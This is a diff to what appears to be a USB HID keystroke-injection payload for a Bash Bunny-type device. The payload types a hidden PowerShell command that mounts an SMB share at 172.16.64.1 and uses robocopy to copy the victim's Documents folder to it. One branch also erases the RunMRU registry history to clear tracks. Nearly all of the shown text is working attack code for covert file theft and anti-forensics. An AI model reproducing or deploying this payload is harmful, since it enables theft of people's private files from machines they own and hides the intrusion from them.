@@ -38,17 +38,22 @@ fi
 # Once found, initiates file copy and exits
 LED R G
 ATTACKMODE HID
-QUACK GUI r
-QUACK DELAY 500
-QUACK STRING PowerShell -WindowStyle Hidden \"Do {Test-NetConnection 192.168.5.60 SMB -InformationLevel quiet} until ($_.TcpTestSucceded); net use \\\172.16.64.1\e guest /USER:guest; robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\"
-QUACK ENTER
 
-# Clear tracks?
+# Clear tracks = yes
 if [ $CLEARTRACKS == "yes" ]; then
+   QUACK Delay 500
+   QUACK GUI r
+   QUACK DELAY 500
+   QUACK STRING PowerShell -WindowStyle Hidden \"Test-NetConnection 172.16.64.1 SMB;net use \\\172.16.64.1\e guest /USER:guest;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'"
+   QUACK ENTER
+fi
+
+# Clear tracks = no
+if [ $CLEARTRACKS == "no" ]; then
    QUACK DELAY 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+   QUACK STRING PowerShell -WindowStyle Hidden \"Test-NetConnection 172.16.64.1 SMB;net use \\\172.16.64.1\e guest /USER:guest;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\
    QUACK ENTER
 fi
 
